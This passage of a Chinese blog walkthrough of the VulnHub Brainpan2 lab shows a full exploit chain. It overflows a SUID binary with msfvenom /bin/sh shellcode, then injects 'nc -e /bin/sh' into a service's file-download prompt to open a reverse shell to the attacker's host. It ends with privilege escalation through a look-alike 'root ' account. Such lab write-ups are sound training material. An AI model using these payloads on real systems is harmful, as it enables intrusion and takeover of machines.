msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>
+
+<p>有了这些知识，开始开发阶段。我的想法很简单。在第二个参数中编写shellcode时，在第一个参数中提供shellcode的地址。因此，第一个参数只能是重复了几次的0x0804a008，这给了我：</p>
+<p>对于第二个参数，需要shellcode。可以在线找到一个或使用msfvenom：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan2<span class="comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -b &quot;x00&quot; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 70 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 70</span><br><span class="line">Payload size: 70 bytes</span><br><span class="line">Final size of python file: 357 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x5e\x3f\x89\x9f\xe1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>填好二个参数,并执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure>
+
+<p>读取flag看看，看起来好像成功了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=104(root) <span class="built_in">groups</span>=106(root),50(staff),1000(anansi)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt  whatif.txt</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: Permission denied</span><br><span class="line">$ <span class="built_in">cat</span> whatif.txt</span><br><span class="line"><span class="built_in">cat</span> whatif.txt</span><br><span class="line"></span><br><span class="line">       WHAT IF I TOLD YOU</span><br><span class="line">              ___</span><br><span class="line">            /     \ </span><br><span class="line">           | ______\</span><br><span class="line">          (, \_/ \_/</span><br><span class="line">           |   ._. |</span><br><span class="line">           \   --- /</span><br><span class="line">           /`-.__.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">      .---&#x27;</span>`-.___|\___</span><br><span class="line">     /                `.</span><br><span class="line"></span><br><span class="line">       YOU ARE NOT ROOT?</span><br><span class="line">$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root  root  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 22 root  root  4096 Nov  5  2013 ..</span><br><span class="line">drwx------  2 root  root  4096 Nov  4  2013 .aptitude</span><br><span class="line">-rw-------  1 root  root     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r--  1 root  root   589 Nov  5  2013 .bashrc</span><br><span class="line">-rw-r--r--  1 root  root   159 Nov  5  2013 .profile</span><br><span class="line">-rw-------  1 root  root   461 Nov  5  2013 flag.txt</span><br><span class="line">-rw-------  1 root  root   245 Nov  5  2013 whatif.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg"></p>
+<p>必须说，root帐户的窍门很不错。有两个帐户，一个名为root，另一个名为root（末尾有空格）。第二个是这里的真正root用户。看来还有很长的路要走…<br>寻找SUID&#x2F;SGID执行权限的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null                                                                                                                                                                                        </span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/opt/old/brainpan-1.8/brainpan-1.8.exe</span><br><span class="line">...</span><br><span class="line">$ <span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line"><span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">brainpan-1.8.exe  brainpan.7  brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line">$ <span class="built_in">cat</span> brainpan.cfg</span><br><span class="line"><span class="built_in">cat</span> brainpan.cfg</span><br><span class="line">port=9333</span><br><span class="line">ipaddr=0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p>启动该应用程序并通过我的机器进行了连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./brainpan-1.8.exe</span><br><span class="line">./brainpan-1.8.exe</span><br><span class="line">port = 9333</span><br><span class="line">ipaddr = 0.0.0.0</span><br><span class="line">+ <span class="built_in">bind</span> <span class="keyword">done</span></span><br><span class="line">+ waiting <span class="keyword">for</span> connections...</span><br><span class="line">+ connection accepted</span><br></pre></td></tr></table></figure>
+
+<p>nc连接之后，执行反弹命令获取shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9333</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 1.8________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.56.102 7777</span><br></pre></td></tr></table></figure>
+
+<p>成功获取了puck用户的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53497</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=1001(puck) <span class="built_in">groups</span>=1001(puck),50(staff),1000(anansi)</span><br><span class="line">python -c <span class="string">&#x27;import os,pty;os.setresuid(1001,1001,1001);pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(puck) gid=1000(anansi) <span class="built_in">groups</span>=1001(puck),50(staff),1000(anansi)</span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">puck</span><br></pre></td></tr></table></figure>
+
+<p>查看puck的文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan2:/home$ <span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh</span><br></pre></td></tr></table></figure>
+
+<p>不是空的bash_history？真奇怪：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cd</span> .backup</span><br><span class="line"><span class="built_in">cd</span> .backup</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">puck@brainpan2:/home/puck/.backup$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 puck puck 4096 Nov  5  2013 .</span><br><span class="line">drwx------ 4 puck puck 4096 Nov  5  2013 ..</span><br><span class="line">-rw------- 1 puck puck  395 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck puck 4096 Nov  4  2013 .ssh</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ <span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">cd</span> /usr/local/bin</span><br><span class="line"><span class="built_in">ls</span> -l</span><br><span class="line">./msg_root <span class="string">&quot;comment on the latest version please&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /opt/brainpan/</span><br><span class="line">ps aux</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line"><span class="built_in">cd</span> ../archive</span><br><span class="line">netstat -antp</span><br><span class="line">netstat -antp | grep 9888</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> old</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> brainpan-1.8</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">vi brainpan.7</span><br><span class="line">man ./brainpan.7</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">htop</span><br><span class="line">top</span><br><span class="line"><span class="built_in">ls</span> -latr</span><br><span class="line"><span class="built_in">cat</span> .bash_history </span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">mkdir</span> .backup</span><br><span class="line"><span class="built_in">mv</span> .ssh .bash* .backup</span><br><span class="line"><span class="built_in">cd</span> .backup/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span> -latr</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">puck@brainpan2:/home/puck/.backup$</span><br></pre></td></tr></table></figure>
+
+<p>因此，puck用户可以通过ssh登录到&#x2F;目录。我做到了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">mv</span> .ssh .ssh-old</span><br><span class="line"><span class="built_in">mv</span> .ssh .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cp</span> -rp .backup/.ssh .</span><br><span class="line"><span class="built_in">cp</span> -rp .backup/.ssh .</span><br><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 32</span><br><span class="line">drwx------ 5 puck  puck   4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root   4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck   4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck      0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck    220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck   3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck    675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  anansi 4096 Nov  4  2013 .ssh</span><br><span class="line">drwx------ 2 puck  puck   4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh: connect to host brainpan2 port 22: Connection refused</span><br></pre></td></tr></table></figure>
+
+<p>看看ssh是否没有运行或在其他端口上运行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cat</span> /etc/ssh/sshd_config</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Package generated configuration file</span></span><br><span class="line"><span class="comment"># See the sshd_config(5) manpage for details</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What ports, IPs and protocols we listen for</span></span><br><span class="line">Port 2222</span><br><span class="line"><span class="comment"># Use these options to restrict which interfaces/protocols sshd will bind to</span></span><br><span class="line"><span class="comment">#ListenAddress ::</span></span><br><span class="line"><span class="comment">#ListenAddress 0.0.0.0</span></span><br><span class="line">ListenAddress 127.0.1.1</span><br><span class="line">Protocol 2</span><br><span class="line"><span class="comment"># HostKeys for protocol version 2</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line"><span class="comment">#Privilege Separation is turned on for security</span></span><br><span class="line">UsePrivilegeSeparation <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lifetime and size of ephemeral version 1 server key</span></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line">ServerKeyBits 768</span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging</span></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authentication:</span></span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">StrictModes <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">RSAAuthentication <span class="built_in">yes</span></span><br><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br><span class="line"><span class="comment">#AuthorizedKeysFile     %h/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span></span><br><span class="line">IgnoreRhosts <span class="built_in">yes</span></span><br><span class="line"><span class="comment"># For this to work you will also need host keys in /etc/ssh_known_hosts</span></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"><span class="comment"># similar for protocol version 2</span></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"><span class="comment"># Uncomment if you don&#x27;t trust ~/.ssh/known_hosts for RhostsRSAAuthentication</span></span><br><span class="line"><span class="comment">#IgnoreUserKnownHosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable empty passwords, change to yes (NOT RECOMMENDED)</span></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to yes to enable challenge-response passwords (beware issues with</span></span><br><span class="line"><span class="comment"># some PAM modules and threads)</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to no to disable tunnelled clear text passwords</span></span><br><span class="line"><span class="comment">#PasswordAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberos options</span></span><br><span class="line"><span class="comment">#KerberosAuthentication no</span></span><br><span class="line"><span class="comment">#KerberosGetAFSToken no</span></span><br><span class="line"><span class="comment">#KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="comment">#KerberosTicketCleanup yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GSSAPI options</span></span><br><span class="line"><span class="comment">#GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#GSSAPICleanupCredentials yes</span></span><br><span class="line"></span><br><span class="line">X11Forwarding <span class="built_in">yes</span></span><br><span class="line">X11DisplayOffset 10</span><br><span class="line">PrintMotd no</span><br><span class="line">PrintLastLog <span class="built_in">yes</span></span><br><span class="line">TCPKeepAlive <span class="built_in">yes</span></span><br><span class="line"><span class="comment">#UseLogin no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#MaxStartups 10:30:60</span></span><br><span class="line"><span class="comment">#Banner /etc/issue.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow client to pass locale environment variables</span></span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span></span><br><span class="line"><span class="comment"># and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="comment"># be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="comment"># PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="comment"># the setting of &quot;PermitRootLogin without-password&quot;.</span></span><br><span class="line"><span class="comment"># If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="comment"># PAM authentication, then enable this but set PasswordAuthentication</span></span><br><span class="line"><span class="comment"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span></span><br><span class="line">UsePAM <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>最后终于成功连接ssh并且找到了flag，过程虽然没有太多很难的知识点，但是真够复杂的，不愧被称为brainpan!!!</p>
